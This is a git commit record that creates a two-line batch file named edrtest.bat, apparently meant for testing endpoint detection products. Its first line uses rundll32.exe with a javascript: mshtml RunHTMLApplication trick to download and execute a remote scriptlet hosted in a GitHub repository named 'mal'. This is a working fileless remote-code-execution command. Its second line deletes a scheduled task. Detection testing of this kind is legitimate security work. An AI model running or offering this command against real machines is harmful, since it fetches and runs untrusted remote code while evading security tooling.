302db494591b98e2dbbcd2be3602ec3d1742bb91
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-01-22 00:38:11 +0900

    Create edrtest.bat

---
+++ edrtest.bat
@@ -0,0 +1,2 @@
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/test")
+schtasks /delete /tn edrtesttask1
